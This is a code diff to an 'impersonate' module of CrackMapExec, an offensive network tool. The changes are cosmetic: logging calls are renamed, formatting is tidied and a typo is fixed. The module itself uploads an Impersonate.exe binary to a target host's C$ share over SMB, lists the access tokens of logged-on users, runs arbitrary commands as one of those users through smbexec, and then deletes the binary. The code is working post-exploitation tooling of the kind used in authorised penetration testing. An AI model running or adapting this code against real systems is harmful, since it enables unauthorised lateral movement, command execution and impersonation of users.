@@ -7,20 +7,21 @@ from base64 import b64decode
 from sys import exit
 from os import path
 
+
 class CMEModule:
 
     name = "impersonate"
     description = "List and impersonate tokens to run command as locally logged on users"
     supported_protocols = ["smb"]
-    opsec_safe = True # could be flagged
+    opsec_safe = True  # could be flagged
     multiple_hosts = True
 
     def options(self, context, module_options):
-        '''
-            TOKEN     // Token id to usurp
-            EXEC      // Command to exec
-            IMP_EXE   // Path to the Impersonate binary on your local computer
-        '''
+        """
+        TOKEN     // Token id to usurp
+        EXEC      // Command to exec
+        IMP_EXE   // Path to the Impersonate binary on your local computer
+        """
 
         self.tmp_dir = "C:\\Windows\\Temp\\"
         self.share = "C$"
@@ -45,7 +46,6 @@ class CMEModule:
         return connection.execute(command, True)
         
     def on_admin_login(self, context, connection):
-
         if self.useembeded:
             file_to_upload = "/tmp/Impersonate.exe"
             with open(file_to_upload, 'wb') as impersonate:
@@ -54,21 +54,21 @@ class CMEModule:
             if path.isfile(self.imp_exe):
                 file_to_upload = self.imp_exe
             else:
-                context.log.error(f"Cannot open {self.imp_exe}")
+                context.log.fail(f"Cannot open {self.imp_exe}")
                 exit(1)
 
-        context.log.info(f"Uploading {self.impersonate}")
+        context.log.display(f"Uploading {self.impersonate}")
         with open(file_to_upload, 'rb') as impersonate:
             try:
                 connection.conn.putFile(self.share, f"{self.tmp_share}{self.impersonate}", impersonate.read)
                 context.log.success(f"Impersonate binary successfully uploaded")
             except Exception as e:
-                context.log.error(f"Error writing file to share {self.tmp_share}: {e}")
+                context.log.fail(f"Error writing file to share {self.tmp_share}: {e}")
                 return
 
         try:
             if self.cmd == "" or self.token == "":
-                context.log.info(f"Listing available primary tokens")
+                context.log.display(f"Listing available primary tokens")
                 p = self.list_available_primary_tokens(context, connection)
                 for line in p.splitlines():
                     token, token_owner = line.split(" ", 1)
@@ -83,18 +83,18 @@ class CMEModule:
                         break
 
                 if impersonated_user:  
-                    context.log.info(f"Executing {self.cmd} as {impersonated_user}")
+                    context.log.display(f"Executing {self.cmd} as {impersonated_user}")
                     command = f"{self.tmp_dir}Impersonate.exe exec {self.token} \"{self.cmd}\""
                     for line in connection.execute(command, True, methods=["smbexec"]).splitlines():
                         context.log.highlight(line)
                 else:
-                    context.log.error(f"Invalid token ID submitted")
+                    context.log.fail(f"Invalid token ID submitted")
 
         except Exception as e:
-            context.log.error(f"Error runing command: {e}")
+            context.log.fail(f"Error running command: {e}")
         finally:
             try:
                 connection.conn.deleteFile(self.share, f"{self.tmp_share}{self.impersonate}")
                 context.log.success(f"Impersonate binary successfully deleted")
             except Exception as e:
-                context.log.error(f"Error deleting Impersonate.exe on {self.share}: {e}")
+                context.log.fail(f"Error deleting Impersonate.exe on {self.share}: {e}")
